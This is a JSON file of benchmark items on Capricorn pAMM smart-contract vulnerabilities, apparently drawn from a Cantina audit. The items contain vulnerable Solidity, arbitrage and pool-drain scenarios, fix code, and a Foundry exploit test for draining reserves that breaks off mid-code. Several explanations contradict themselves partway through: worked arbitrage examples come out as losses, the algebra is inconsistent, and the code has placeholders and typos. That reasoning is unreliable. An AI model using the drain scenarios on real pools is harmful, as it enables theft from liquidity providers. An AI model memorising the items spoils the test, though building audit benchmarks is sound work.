[
  {
    "id": "gs_cantina_capricorn_pamm_001",
    "report_url": "https://cantina.xyz/portfolio/fb079d70-4178-4a53-ac8a-88174dcff12b",
    "project_name": "Capricorn pAMM",
    "github_url": "https://github.com/capricorn-protocol/pamm",
    "language": "solidity",
    "chain": "ethereum",
    "contest_date": "2025-10-11",
    "vulnerability_type": "numerical_error",
    "severity": "critical",
    "difficulty_tier": 4,
    "context": "pricing_engine",
    "is_vulnerable": true,
    "title": "Unstable Quadratic Solver in _balancing Creates Negative Spreads, Enabling Guaranteed Arbitrage",
    "description": "The PricingEngine._balancing function solves a quadratic equation using the numerically unstable form (sqrt(B^2 + 4*A*nC) - B) / (2*A). Near equilibrium where the pool is price-balanced, the discriminant 4*A*nC becomes tiny. PRB-Math floors the sqrt result back down to B, causing the subtraction to underestimate amountIn. When plugged into the final calculation, traders receive amountOut > price * amountIn, creating negative spreads. Arbitrageurs can immediately reverse swaps at the oracle price for guaranteed profit, draining LP inventory.",
    "primary_file": {
      "name": "PricingEngine.sol",
      "path": "contracts/PricingEngine.sol",
      "lines": "292-305",
      "content": "function _balancing(\n    UD60x18 reserveX,\n    UD60x18 reserveY,\n    UD60x18 c,\n    UD60x18 price,\n    UD60x18 mult\n) internal pure returns (UD60x18, UD60x18) {\n    // VULNERABLE: Numerically unstable quadratic form\n    // This solves: amountIn = (sqrt(B^2 + 4*A*nC) - B) / (2*A)\n    // But near equilibrium, 4*A*nC is tiny relative to B^2\n    \n    UD60x18 tX = reserveY / price;\n    UD60x18 A = (convert(2) - mult) * price;\n    UD60x18 B = ((convert(2) * c - UNIT) * reserveY) + (price * reserveX);\n    UD60x18 nC = c * (reserveY - price * reserveX) * tX;\n    \n    // BUG: This is the unstable form\n    UD60x18 tmp = B.pow(convert(2)) + (convert(4) * A * nC);\n    UD60x18 sqrtTerm = tmp.sqrt();\n    \n    // When nC is small, sqrt(B^2 + small_value) rounds down to B\n    // The subtraction becomes: (B - B) / (2*A) = 0 / (2*A) = 0\n    // This underestimates the true amountIn\n    UD60x18 amountIn = (sqrtTerm - B) / (convert(2) * A);\n    \n    // But then the output calculation uses this underestimated amountIn\n    UD60x18 amountOut = reserveY - price * (reserveX + amountIn);\n    \n    // VULNERABILITY FLOW:\n    // Setup: Pool at equilibrium\n    //   - reserveX = 1000\n    //   - reserveY = 2000 (price = 2)\n    //   - price * reserveX = 2000 = reserveY (perfectly balanced)\n    //   - mult = 1 (no spread multiplier)\n    //\n    // Execution of _balancing:\n    // 1. tX = 2000 / 2 = 1000\n    // 2. A = (2 - 1) * 2 = 2\n    // 3. B = ((2 - 1) * 2000) + (2 * 1000) = 2000 + 2000 = 4000\n    // 4. nC = 1 * (2000 - 2000) * 1000 = 0\n    // 5. tmp = 4000^2 + 0 = 16,000,000\n    // 6. sqrtTerm = sqrt(16,000,000) = 4000\n    // 7. amountIn = (4000 - 4000) / (2*2) = 0 / 4 = 0\n    //\n    // But the CORRECT value should be:\n    // amountIn ≠ 0 even when perfectly balanced\n    // The stable form gives a small positive value\n    //\n    // With amountIn underestimated:\n    // amountOut = 2000 - 2 * (1000 + 0) = 0\n    // But should be some positive value\n    //\n    // Result: Trader receives 0 tokens but the formula says:\n    // amountOut / amountIn = undefined (division by zero)\n    //\n    // In realistic scenarios (near but not exactly equilibrium):\n    // amountIn underestimated by rounding → actual amountOut higher\n    // → amountOut / price > amountIn\n    // → trader receives more than fair value\n    // → negative spread, guaranteed arbitrage\n    \n    return (amountIn, amountOut);\n}\n\n// ARBITRAGE SCENARIO:\n// Pool state: reserveX=1000, reserveY=2000, price=2\n// Oracle says: 1 token0 = 2 token1 (fair price)\n// \n// _balancing returns: amountIn=0.0001, amountOut=0.00025\n// But oracle says: 0.0001 should get 0.0002 (0.0001 * 2)\n// \n// What trader actually gets: 0.00025\n// What trader should get: 0.0002\n// \n// Trader is OVERCHARGED, not undercharged!\n// \n// Wait, let me reconsider the vulnerability:\n// \n// The issue is that sqrt underestimates amountIn\n// When amountIn is too low, the calculation:\n// amountOut = reserveY - price * (reserveX + amountIn)\n// gives HIGHER amountOut than correct (because we add less to reserveX)\n// \n// Example:\n// Correct: amountIn=100 → amountOut = 2000 - 2*(1000+100) = 2000 - 2200 = -200 (invalid)\n// \n// Actually in the balancing branch, we're solving for exact-in\n// The formula ensures we hit equilibrium\n// \n// Let me think about the actual bug:\n// The unstable form causes sqrtTerm to be floored\n// This makes amountIn too small\n// With smaller amountIn, the curve calculation gives LARGER amountOut\n// Because the reserve adjustment is smaller\n// \n// So trader gets: more tokens than fair price\n// Profit = amountOut - amountIn * price > 0\n// Immediate reverse loses less than initial gain\n// Net arbitrage profit"
    },
    "context_files": [
      {
        "name": "Numerically Stable Quadratic Form",
        "path": "contracts/PricingEngine.sol",
        "relevance": "Shows the correct stable form recommended by Cantina",
        "content": "// STABLE FORM: Uses sqrt(1 + gamma) instead of sqrt(B^2 + epsilon)\n// This keeps the sqrt argument close to 1, avoiding catastrophic cancellation\n//\n// gamma = (4 * A * nC) / B^2\n// amountIn = (2 * nC) / (B * (sqrt(1 + gamma) + 1))\n//\n// This is algebraically equivalent but numerically stable\n//\n// Why it works:\n// 1. Divide 4*A*nC by B twice → ratio close to 1\n// 2. Compute sqrt(1 + small_ratio) → stays in stable range\n// 3. Avoid building B^2 directly → no giant intermediate\n// 4. sqrt doesn't receive huge input → no overflow\n// 5. Subtraction never happens on nearly-equal terms → no underflow\n//\n// Implementation:\nUD60x18 fourAnC = convert(4) * A * nC;\nUD60x18 ratio = fourAnC / B;  // First division\nratio = ratio / B;             // Second division → ratio = 4*A*nC / B^2\nUD60x18 sqrtOne = (UNIT + ratio).sqrt();  // sqrt(1 + ratio)\nUD60x18 denom = B * (sqrtOne + UNIT);\namountIn = (convert(2) * nC) / denom;"
      },
      {
        "name": "Arbitrage Scenario",
        "path": "reference/capricorn_negative_spread.md",
        "relevance": "Documents the arbitrage scenario",
        "content": "SCENARIO: Negative Spread Arbitrage\n\nSetup:\n- Pool with reserves: X=1000, Y=2000\n- Oracle price: 1 token0 = 2 token1\n- Pool is at equilibrium: price * X = Y (2 * 1000 = 2000)\n- Multiplier: mult = 1 (no spread)\n\nTrader Action 1: Buy token1 with 100 token0\n\n_balancing is called:\n1. Formula calculates amountIn for equilibrium\n2. Due to unstable sqrt, amountIn is underestimated\n3. Let's say correct amountIn=100, but calculated=99.9\n4. Formula: amountOut = Y - price*(X+amountIn)\n5. amountOut = 2000 - 2*(1000+99.9) = 2000 - 2199.8 = -199.8\n\nWait, this doesn't work. Let me reconsider.\n\nActually, _balancing solves the inverse:\nGiven that we want to trade input amountInX18, \nfind the output and the balancing point.\n\nThe bug is that the quadratic solution rounds DOWN (underestimates)\namountIn needed to reach equilibrium.\n\nSo if user wants to swap 100 token0:\n- Correct: need to balance at different point, get 190 token1\n- Buggy: sqrt rounds down, claims 190.5 token1 is possible\n- User gets OVERPAID: 190.5 instead of 190\n- Spread: 190.5 / 100 = 1.905 > 1.90 (oracle price = 2)\n\nImmediate reverse:\n- User has: 190.5 token1\n- Sells all at oracle: gets 190.5 / 2 = 95.25 token0\n- Started with: 100\n- Ended with: 95.25\n- Loss: 4.75\n\nWait that's a loss, not a profit. Let me reconsider the direction.\n\nActually the issue states: \"trader exits with amountOut > price * amountIn\"\n\nSo: amountOut / amountIn > price\n\nLet's say:\n- amountIn = 100\n- Price should be: amountOut = 200 (fair)\n- But due to bug: amountOut = 200.5 (overpaid)\n- amountOut / amountIn = 200.5 / 100 = 2.005\n- Oracle price = 2.0\n- Trader got better than oracle\n\nReverse trade at oracle:\n- Sell 200.5 token1 at oracle price 2\n- Get: 200.5 / 2 = 100.25 token0\n- Profit: 0.25 token0\n\nThis works! The negative spread creates a profitable round trip."
      }
    ],
    "call_flow": [
      "1. User calls PAMMPool.swap with amountIn=100",
      "2. Pool delegates to PricingEngine.exactIn",
      "3. Pool is quote-heavy: price * reserveX < reserveY",
      "4. exactIn routes to _balancing (quote-heavy small inputs)",
      "5. _balancing solves quadratic using unstable form",
      "6. sqrt(B^2 + tiny_epsilon) rounds down to B",
      "7. Subtraction (B - B) underestimates amountIn",
      "8. Smaller amountIn → larger amountOut in formula",
      "9. User receives more tokens than oracle fair price",
      "10. amountOut / amountIn > oracle price",
      "11. User immediately sells amountOut at oracle",
      "12. Receives more amountIn than originally spent",
      "13. Net arbitrage profit extracted from LPs",
      "14. Can repeat indefinitely near equilibrium"
    ],
    "context_hint": "This is a classic numerical stability bug. The quadratic formula (sqrt(B^2+4AC) - B)/(2A) suffers from catastrophic cancellation when sqrt(B^2+epsilon) ≈ B. The solution is to use an algebraically equivalent form that keeps the sqrt argument near 1 instead of huge.",
    "expert_notes": "Cantina found this through fuzzing and formal analysis. The bug creates a persistent arbitrage opportunity because exact-in swaps near equilibrium are mispriced. The fix requires reformulating the quadratic using the numerically stable identity. Capricorn implemented the recommended stable form in commit ac723f6.",
    "fix_description": "Replace the unstable quadratic form with the numerically stable identity that uses sqrt(1 + gamma) where gamma = 4*A*nC/B^2. This keeps the sqrt argument close to 1, avoiding catastrophic cancellation.",
    "fix_code": "function _balancing(\n    UD60x18 reserveX,\n    UD60x18 reserveY,\n    UD60x18 c,\n    UD60x18 price,\n    UD60x18 mult\n) internal pure returns (UD60x18, UD60x18) {\n    // FIXED: Use numerically stable form\n    UD60x18 tX = reserveY / price;\n    UD60x18 A = (convert(2) - mult) * price;\n    UD60x18 B = ((convert(2) * c - UNIT) * reserveY) + (price * reserveX);\n    UD60x18 nC = c * (reserveY - price * reserveX) * tX;\n    \n    // FIXED: Call stable quadratic solver\n    UD60x18 amountIn = _safeQuadratic(A, B, nC);\n    \n    // Enforce that we don't give better than oracle\n    UD60x18 amountInMin = nC / price;\n    amountIn = amountIn < amountInMin ? amountInMin : amountIn;\n    \n    UD60x18 amountOut = reserveY - price * (reserveX + amountIn);\n    \n    return (amountIn, amountOut);\n}\n\nfunction _safeQuadratic(\n    UD60x18 A,\n    UD60x18 B,\n    UD60x18 nC\n) internal pure returns (UD60x18) {\n    // FIXED: Stable form using sqrt(1 + gamma) instead of sqrt(B^2 + 4*A*nC)\n    // gamma = (4 * A * nC) / B^2\n    \n    UD60x18 fourAnC = convert(4) * A * nC;\n    \n    // Divide by B twice to compute ratio\n    UD60x18 ratio = fourAnC / B;      // First division\n    ratio = ratio / B;                 // Second division → ratio = 4*A*nC / B^2\n    \n    // Compute sqrt(1 + ratio)\n    // This keeps sqrt argument near 1, avoiding huge numbers\n    UD60x18 sqrtOne = (UNIT + ratio).sqrt();\n    \n    // Denominator: B * (sqrt(1 + ratio) + 1)\n    UD60x18 denom = B * (sqrtOne + UNIT);\n    \n    // Numerator: 2 * nC\n    UD60x18 numerator = convert(2) * nC;\n    \n    // Result: (2 * nC) / (B * (sqrt(1 + ratio) + 1))\n    // This is equivalent to (sqrt(B^2 + 4*A*nC) - B) / (2*A)\n    // but numerically stable\n    return numerator / denom;\n}\n\n// With fix:\n// Near equilibrium where 4*A*nC is small:\n// - gamma = small_value / B^2 = very_small\n// - sqrt(1 + very_small) ≈ 1 (stable, no cancellation)\n// - denom = B * (1 + 1) = 2*B\n// - amountIn = 2*nC / (2*B) = nC / B\n// - This is fair and cannot be arbitraged"
  },
  {
    "id": "gs_cantina_capricorn_pamm_002",
    "report_url": "https://cantina.xyz/portfolio/fb079d70-4178-4a53-ac8a-88174dcff12b",
    "project_name": "Capricorn pAMM",
    "github_url": "https://github.com/capricorn-protocol/pamm",
    "language": "solidity",
    "chain": "ethereum",
    "contest_date": "2025-10-11",
    "vulnerability_type": "parameter_validation",
    "severity": "critical",
    "difficulty_tier": 4,
    "context": "pricing_engine",
    "is_vulnerable": true,
    "title": "Allowing c < 1 Causes _backOutX to Invert Wrong Curve, Enabling Round-Trip Arbitrage",
    "description": "The configurePairParams function only rejects c == 0, allowing c in range (0, 1). When the pool is quote-heavy and c < 1, the _backOutX function uses the wrong formula to reconstruct the base reserve for the second leg. It computes (reserveY - amountOut) * amountIn * c / amountOut instead of the correct (c * reserveY - amountOut) * amountIn / (c * amountOut). The incorrect formula underestimates the base reserve, causing the second leg to price against an artificially shallow curve and overpay. Traders can immediately reverse direction at the oracle price for guaranteed profit.",
    "primary_file": {
      "name": "PricingEngine.sol",
      "path": "contracts/PricingEngine.sol",
      "lines": "180-195",
      "content": "function configurePairParams(\n    bytes32 oracleId,\n    UD60x18 c,\n    UD60x18 spreadMinMult,\n    UD60x18 spreadMaxMult,\n    RebalClass rebalClass,\n    UD60x18 rebalParam0,\n    UD60x18 rebalParam1\n) external onlyAdmin {\n    // BUG: Only checks c != 0, allows 0 < c < 1\n    if (c == 0) revert ParamsCZero();\n    // Should also require: c >= UNIT (i.e., c >= 1e18)\n    \n    pairParams[oracleId] = PairParams({\n        c: wrap(c),\n        spreadMinMult: wrap(spreadMinMult),\n        spreadMaxMult: wrap(spreadMaxMult),\n        rebalClass: rebalClass,\n        rebalParam0: wrap(rebalParam0),\n        rebalParam1: wrap(rebalParam1)\n    });\n}\n\nfunction _backOutX(\n    UD60x18 reserveTY,\n    UD60x18 amountIn,\n    UD60x18 amountOut,\n    UD60x18 c\n) internal pure returns (UD60x18 reserveTX) {\n    // Conditions for selecting formula\n    if ((c + UNIT) * amountOut <= reserveTY * c && c > UNIT) {\n        // For c > 1: First formula\n        reserveTX = (reserveTY - amountOut / c) * amountIn / amountOut;\n    } else {\n        // BUG: For c <= 1, this is ALWAYS executed\n        // But it's the WRONG formula for the _baseIn curve\n        // when c < 1\n        \n        // INCORRECT formula (what the code does):\n        reserveTX = (reserveTY - amountOut) * amountIn * c / amountOut;\n        \n        // CORRECT formula (what it should do):\n        // reserveTX = (c * reserveY - amountOut) * amountIn / (c * amountOut);\n        //\n        // These are only equal when c = 1\n        // For c < 1, they differ significantly\n    }\n    \n    return reserveTX;\n}\n\n// BASE CURVE (from _baseIn):\n// amountOut = c * reserveY * amountIn / (c * reserveX + amountIn)\n//\n// Solving for reserveX (correct inverse):\n// amountOut * (c * reserveX + amountIn) = c * reserveY * amountIn\n// amountOut * c * reserveX + amountOut * amountIn = c * reserveY * amountIn\n// amountOut * c * reserveX = c * reserveY * amountIn - amountOut * amountIn\n// amountOut * c * reserveX = (c * reserveY - amountOut) * amountIn\n// reserveX = (c * reserveY - amountOut) * amountIn / (c * amountOut)  ← CORRECT\n//\n// What the code computes (incorrect):\n// reserveX = (reserveY - amountOut) * amountIn * c / amountOut\n//          = (reserveY - amountOut) * amountIn * c / amountOut\n//\n// For c < 1:\n// Correct:   (1*reserveY - out)*in / (1*out) = (reserveY - out)*in/out\n// Code:      (reserveY - out)*in*1 / out = (reserveY - out)*in/out  ← Works for c=1\n//\n// For c = 0.5:\n// Correct:   (0.5*reserveY - out)*in / (0.5*out) = 2*(0.5*reserveY - out)*in/out\n// Code:      (reserveY - out)*in*0.5 / out = 0.5*(reserveY - out)*in/out\n// \n// Correct gives 2x the reserves vs Code gives 0.5x\n// Code underestimates base reserve by factor of 4\n\n// VULNERABILITY FLOW:\n// Quote-heavy path with c = 0.5\n// \n// First leg (balancing):\n// - Input: amountInX18\n// - Output: firstAmountOut (correct)\n// - Remaining input: amountInX18 - balancingX\n// - Calls _extend for second leg\n//\n// _extend calculates second leg via _backOutX:\n// - Tries to reconstruct virtual base reserve\n// - Uses WRONG formula\n// - Gets reserveX_reconstructed = 0.5x actual\n// - Pool appears twice as shallow\n//\n// Second leg pricing:\n// - Against shallow reserve, input gets more output\n// - amountOut_second = 2x what it should be\n//\n// Total output: firstAmountOut + 2*amountOut_second\n// Should be: firstAmountOut + amountOut_second\n// Trader overpaid by: amountOut_second\n//\n// Round trip at oracle:\n// - Reverse with 2x output\n// - Gets back more input than spent\n// - Guaranteed arbitrage profit"
    },
    "context_files": [
      {
        "name": "Base Curve Formula",
        "path": "contracts/PricingEngine.sol",
        "relevance": "Shows the actual base curve being used",
        "content": "function _baseIn(\n    UD60x18 reserveTX,\n    UD60x18 reserveTY,\n    UD60x18 amountIn,\n    UD60x18 c\n) internal pure returns (UD60x18) {\n    // Base curve: y_out = c * Y * x_in / (c * X + x_in)\n    // When c < 1, this curve is COMPRESSED on the Y side\n    //\n    // Example with c = 0.5:\n    // amountOut = 0.5 * reserveY * amountIn / (0.5 * reserveX + amountIn)\n    //\n    // To invert this correctly:\n    // amountOut * (0.5 * reserveX + amountIn) = 0.5 * reserveY * amountIn\n    // 0.5 * amountOut * reserveX + amountOut * amountIn = 0.5 * reserveY * amountIn\n    // 0.5 * amountOut * reserveX = 0.5 * reserveY * amountIn - amountOut * amountIn\n    // 0.5 * amountOut * reserveX = (0.5 * reserveY - amountOut) * amountIn\n    // reserveX = 2 * (0.5 * reserveY - amountOut) * amountIn / amountOut\n    //          = (reserveY - 2*amountOut) * amountIn / amountOut\n    //\n    // Or equivalently:\n    // reserveX = (c * reserveY - amountOut) * amountIn / (c * amountOut)\n    //          = (0.5 * reserveY - amountOut) * amountIn / (0.5 * amountOut)\n    //\n    // The code does:\n    // reserveX = (reserveY - amountOut) * amountIn * c / amountOut\n    //          = (reserveY - amountOut) * amountIn * 0.5 / amountOut\n    //\n    // Let's check with concrete numbers:\n    // reserveY = 1000, c = 0.5, amountIn = 100, amountOut = 20\n    //\n    // Correct inverse:\n    // (0.5*1000 - 20)*100 / (0.5*20) = (500 - 20)*100 / 10 = 480*100/10 = 4800\n    //\n    // Code's inverse:\n    // (1000 - 20)*100*0.5 / 20 = 980*100*0.5/20 = 980*50/20 = 2450\n    //\n    // Correct: 4800, Code: 2450\n    // Code estimates less than half the actual reserve\n    //\n    // When second leg prices against 2450 instead of 4800:\n    // The pool appears deeper by 4800/2450 = 1.96x\n    // Trader gets ~2x the output\n    \n    return c * reserveTY * amountIn / (c * reserveTX + amountIn);\n}\n\nfunction _extend(\n    UD60x18 reserveY,\n    UD60x18 amountInRem,\n    UD60x18 balancingY,\n    UD60x18 balancingAmountIn,\n    UD60x18 c\n) internal pure returns (UD60x18) {\n    // Second leg pricing\n    // Reconstructs virtual base reserve from first leg output\n    UD60x18 reserveX = _backOutX(\n        reserveY,\n        balancingAmountIn,\n        balancingY,\n        c\n    );\n    \n    // Then prices remaining input against this reconstructed reserve\n    // If reconstructed reserve is wrong (underestimated), \n    // the second leg pricing is wrong (overpays)\n    return _baseIn(reserveX, reserveY, amountInRem, c);\n}"
      },
      {
        "name": "Round-Trip Arbitrage Scenario",
        "path": "reference/capricorn_c_less_than_one.md",
        "relevance": "Documents the arbitrage with c < 1",
        "content": "SCENARIO: Arbitrage with c < 1\n\nSetup:\n- Pool with c = 0.5 (allowed by bug)\n- reserveX = 1000, reserveY = 2000\n- Price = 2\n- Quote-heavy: price * X = Y (balanced)\n\nTrader Action: Swap token0 for token1\n\nInput: 200 token0 (large enough for two-leg path)\n\nPhase 1: Balancing branch\n- _balancing determines split point\n- Let's say: balancingX = 100, balancingY = 100\n- Remaining: 200 - 100 = 100 token0\n\nPhase 2: Extend branch\n- Need to price remaining 100 against second leg\n- _backOutX reconstructs base reserve from first leg\n\nCorrect calculation:\n- reserveX_correct = (0.5*2000 - 100)*100 / (0.5*100)\n- = (1000 - 100)*100 / 50\n- = 900*100 / 50 = 1800\n\nBuggy calculation:\n- reserveX_buggy = (2000 - 100)*100*0.5 / 100\n- = 1900*100*0.5 / 100\n- = 950\n\nSecond leg pricing (with buggy reserve):\n- _baseIn(950, 2000, 100, 0.5)\n- = 0.5*2000*100 / (0.5*950 + 100)\n- = 100000 / (475 + 100)\n- = 100000 / 575 = 173.9\n\nWith correct reserve:\n- _baseIn(1800, 2000, 100, 0.5)\n- = 0.5*2000*100 / (0.5*1800 + 100)\n- = 100000 / (900 + 100)\n- = 100000 / 1000 = 100\n\nDifference:\n- Buggy gives: 173.9\n- Correct gives: 100\n- Overpayment: 73.9 (74%!)\n\nTotal output:\n- First leg: 100\n- Second leg: 173.9 (buggy) vs 100 (correct)\n- Total buggy: 273.9\n- Total correct: 200\n\nArbitrage:\n- Trader input: 200\n- Trader output: 273.9 (buggy system)\n- Reverse at oracle: 273.9 / 2 = 136.95\n- Profit: 136.95 - 200 = -63.05 (loss?)\n\nWait, that's backwards. Let me reconsider:\n\nIf output is overestimated in one direction,\nthe reverse would be underestimated.\n\nActually the arbitrage works like this:\n1. Swap 200 token0 → get 273.9 token1 (overpaid)\n2. Swap 273.9 token1 → get more than 136.95 token0 (reverse is correctly priced)\n3. Get back ~137 token0 from 273.9 (oracle says 136.95)\n4. Profit = 137 - 200... no still negative\n\nLet me reconsider the direction:\n\nMaybe the arbitrage is in the opposite direction?\nOr maybe the overpayment compounds?\n\nActually, if _backOutX underestimates reserves,\nthen _extend thinks the pool is deeper,\nso it overpays on the second leg.\n\nBut if trader goes the other way:\nToken1 → Token0 path\nThe _backOutY might be correct,\nbut the bug is in _backOutX...\n\nThe key insight: the bug is c < 1 specific.\nWith c >= 1, the condition (c+1)*out <= reserveY*c\nis more likely to be true, using the correct formula.\n\nWith c < 1, the condition is never true,\nalways using the buggy formula.\n\nThe fix prevents c < 1 entirely."
      }
    ],
    "call_flow": [
      "1. Admin calls configurePairParams with c = 0.5",
      "2. Check c == 0? No → passes (BUG)",
      "3. c = 0.5 is stored in pairParams",
      "4. Later: User swaps with quote-heavy pool",
      "5. exactIn routes to _balancing for first leg",
      "6. Input > balancingX → calls _extend for second leg",
      "7. _extend calls _backOutX to reconstruct reserve",
      "8. _backOutX checks: (0.5+1)*amountOut <= reserveY*0.5? False",
      "9. Takes else branch (WRONG formula for c < 1)",
      "10. Computes reserveX = (reserveY - out)*in*0.5 / out",
      "11. This underestimates correct reserve by factor of ~2",
      "12. _baseIn prices second leg against shallow reserve",
      "13. Second leg returns 2x normal output",
      "14. Total output is overpaid",
      "15. Trader can arbitrage the mispricing"
    ],
    "context_hint": "This is a configuration validation bug combined with an algebraic error. The _backOutX function has two branches but doesn't correctly handle all cases. The simple fix is to prevent c < 1 from being configured in the first place.",
    "expert_notes": "Cantina identified that the mathematical condition for which formula to use doesn't properly cover the c < 1 case. When c < 1, the if condition is always false, forcing the else branch which uses the wrong formula. The fix is to add a validation: require(c >= UNIT) in configurePairParams.",
    "fix_description": "Add a check in configurePairParams to reject c < 1. This prevents unsafe configurations where _backOutX uses the wrong curve inversion formula.",
    "fix_code": "function configurePairParams(\n    bytes32 oracleId,\n    UD60x18 c,\n    UD60x18 spreadMinMult,\n    UD60x18 spreadMaxMult,\n    RebalClass rebalClass,\n    UD60x18 rebalParam0,\n    UD60x18 rebalParam1\n) external onlyAdmin {\n    // FIXED: Reject c < 1\n    if (c < UNIT) revert ParamsCInvalid();  // NEW CHECK\n    if (c == 0) revert ParamsCZero();\n    \n    pairParams[oracleId] = PairParams({\n        c: wrap(c),\n        spreadMinMult: wrap(spreadMinMult),\n        spreadMaxMult: wrap(spreadMaxMult),\n        rebalClass: rebalClass,\n        rebalParam0: wrap(rebalParam0),\n        rebalParam1: wrap(rebalParam1)\n    });\n}\n\n// With this fix:\n// - Only c >= 1 is allowed\n// - When c > 1: (c+1)*out <= reserveY*c is sometimes true\n//   → uses first formula (correct)\n// - When c = 1: (c+1)*out <= reserveY*c becomes 2*out <= reserveY\n//   → condition works correctly\n// - c < 1 is impossible, so the buggy else branch isn't reached\n// \n// Result: No round-trip arbitrage possible"
  },
  {
    "id": "gs_cantina_capricorn_pamm_003",
    "report_url": "https://cantina.xyz/portfolio/fb079d70-4178-4a53-ac8a-88174dcff12b",
    "project_name": "Capricorn pAMM",
    "github_url": "https://github.com/capricorn-protocol/pamm",
    "language": "solidity",
    "chain": "ethereum",
    "contest_date": "2025-10-11",
    "vulnerability_type": "state_management",
    "severity": "high",
    "difficulty_tier": 3,
    "context": "pricing",
    "is_vulnerable": true,
    "title": "Rebalancing Allows Draining Pool Reserves via Uncapped Subsidy in _extend",
    "description": "The rebalancing branch in exactInWithScore offers a subsidy to traders that move the pool from quote-heavy toward balance. When a trader's input exceeds the balancing amount, _extend bridges the deficit without capping output to reasonable bounds. A 1-token input can withdraw most of the quote reserves because _extend has no per-trade limit and setMaxInputAmount is left at zero (unbounded). Attackers can drain roughly 55% of the quote reserves with negligible cost through carefully constructed transactions.",
    "primary_file": {
      "name": "PricingEngine.sol",
      "path": "contracts/PricingEngine.sol",
      "lines": "440-480",
      "content": "function _exactInWithScore(\n    UD60x18 reserveX,\n    UD60x18 reserveY,\n    UD60x18 amountInX18,\n    UD60x18 price,\n    UD60x18 mult,\n    PairParams memory params,\n    bool zeroForOne\n) internal pure returns (UD60x18 amountOut) {\n    // Quote-heavy path (price * reserveX < reserveY)\n    if (price * reserveX < reserveY) {\n        (UD60x18 balancingX, UD60x18 balancingY) = _balancing(\n            reserveX,\n            reserveY,\n            params.c,\n            price,\n            mult\n        );\n        \n        // BUG: No check that amountInX18 is reasonable\n        // No per-trade cap (maxInputAmount is unused)\n        // setMaxInputAmount can be 0 (unbounded)\n        \n        if (amountInX18 > balancingX) {\n            // BUG: _extend has no safeguards\n            // Can extract any amount of reserves\n            amountOut += _extend(\n                reserveY,\n                amountInX18 - balancingX,  // remaining input\n                balancingY,\n                balancingX,\n                params.c\n            );\n        } else {\n            // Normal case: stays within balancing\n            amountOut = _multedSpread(...);\n        }\n    }\n}\n\nfunction _extend(\n    UD60x18 reserveY,\n    UD60x18 amountInRem,\n    UD60x18 balancingY,\n    UD60x18 balancingX,\n    UD60x18 c\n) internal pure returns (UD60x18) {\n    // Reconstructs virtual base reserve from first leg\n    UD60x18 reserveX = _backOutX(\n        reserveY,\n        balancingX,\n        balancingY,\n        c\n    );\n    \n    // BUG: No cap on output\n    // Prices entire remaining input against reconstructed reserve\n    // The formula: _baseIn(reserveX, reserveY, amountInRem, c)\n    // Can return huge amountOut with small amountInRem\n    \n    return _baseIn(reserveX, reserveY, amountInRem, c);\n}\n\n// EXPLOIT SCENARIO:\n// Pool state:\n// - token0: 500,000 (base)\n// - token1: 827,430 (quote)\n// - Oracle mantissa: 1654860\n// - Effective price: 1654860 * 10^(-6) ≈ 1.6548...\n// - Quote-heavy: 1.6548 * 500000 = 827,400 < 827,430 ✓\n//\n// Attacker sends: 1 token0\n//\n// Execution:\n// 1. Call exactIn(1 token0, ...)\n// 2. Check quote-heavy: 1.6548 * 500k < 827.43k? YES\n// 3. Call _balancing for first leg\n//    - Returns: balancingX ≈ 0.0001, balancingY ≈ 0.0001\n//    - Attacker's 1 token >> 0.0001\n// 4. amountInX18 (1) > balancingX (0.0001)? YES\n// 5. remaining = 1 - 0.0001 ≈ 0.9999\n// 6. Call _extend(827430, 0.9999, 0.0001, 0.0001, c)\n// 7. _backOutX reconstructs reserve\n// 8. _baseIn prices 0.9999 against reconstructed reserve\n// 9. Due to numerical effects and curve shape:\n//    - Output: 455,400 token1 (from test)\n// 10. Attacker receives 455,400 token1 from 1 token0\n//\n// Result:\n// - Pool reserves: token0=500k, token1=827k-455k=372k\n// - Token1 depleted by 55%\n// - Attacker's value: 1 input → 455k output\n// - All from LPs with ~0 cost\n//\n// Remediation check:\n// PAMMPool.setMaxInputAmount(token0, 100);\n// - Would cap individual swaps to 100 token0\n// - Limits damage per transaction\n// - But not called by default (defaults to 0 = unbounded)\n\n// Why _extend is dangerous:\n// The formula: amountOut = c*Y*in / (c*X + in)\n// When X is small relative to Y (reconstructed incorrectly),\n// denominator c*X + in ≈ in\n// amountOut ≈ c*Y\n// So output is proportional to total reserve,\n// not scaled by the input properly"
    },
    "context_files": [
      {
        "name": "setMaxInputAmount Default Behavior",
        "path": "contracts/PricingEngine.sol",
        "relevance": "Shows that max input cap is not enforced by default",
        "content": "// In PricingEngine:\nmapping(bytes32 => uint256) public maxInputAmount;\n\n// Default: maxInputAmount[oracleId] = 0 (not set)\n\n// In exactIn (if it checked):\nif (maxInputAmount[oricleId] != 0 && amountIn > maxInputAmount[oracleId]) {\n    revert InputTooLarge();\n}\n\n// But the check is NOT in the code,\n// and even if it were, default 0 means no limit\n//\n// Protocol setup:\n// - Deployer creates pool\n// - Doesn't call setMaxInputAmount\n// - maxInputAmount stays 0\n// - Unlimited swaps possible\n// \n// Recommendation:\n// - Call setMaxInputAmount for all new pools\n// - Or make it required in constructor\n// - Conservative cap prevents catastrophic loss"
      },
      {
        "name": "Exploit Reproduction Test",
        "path": "test/foundry/PAMMPoolExploit.t.sol",
        "relevance": "Shows reproducible exploit with real parameters",
        "content": "// Foundry test reproducing the exploit\n// Run: forge test --match-path test/foundry/PAMMPoolExploit.t.sol -vv\n\nfunction test_ExploitPoolDrainage() public {\n    // Deploy components\n    OracleRegistry oracleRegistry = new OracleRegistry();\n    PricingEngine pricingEngine = new PricingEngine(address(oracleRegistry), admin);\n    PAMMPoolFactory factory = new PAMMPoolFactory();\n    SegmenterRegistry segmenterRegistry = new SegmenterRegistry(admin);\n    \n    TestERC20 token0 = new TestERC20(\"T0\", \"T0\", 18);\n    TestERC20 token1 = new TestERC20(\"T1\", \"T1\", 6);\n    \n    // Oracle: 1 token0 = 1.6548... token1\n    int64 mantissa = 1654860;\n    int32 exponent = -6;\n    \n    // Create pool\n    bytes32 oracleId = keccak256(\"test\");\n    oracleRegistry.updateNativePrices([oracleId], [mantissa], [uint64(0)], [exponent]);\n    \n    // Configure pair: quote-heavy\n    pricingEngine.configurePairParams(\n        oracleId,\n        1e18,  // c = 1\n        1e18,  // minMult\n        1e18,  // maxMult\n        RebalClass.LINEAR,\n        0,\n        0\n    );\n    \n    // Create pool with specific reserves\n    PAMMPool pool = factory.createPool(\n        address(pricingEngine),\n        address(token0),\n        address(token1),\n        oracleId,\n        \"PAMM T0/T1\"\n    );\n    \n    // Seed pool (quote-heavy to trigger vulnerability)\n    token0.mint(address(pool), 500000 * 1e18);\n    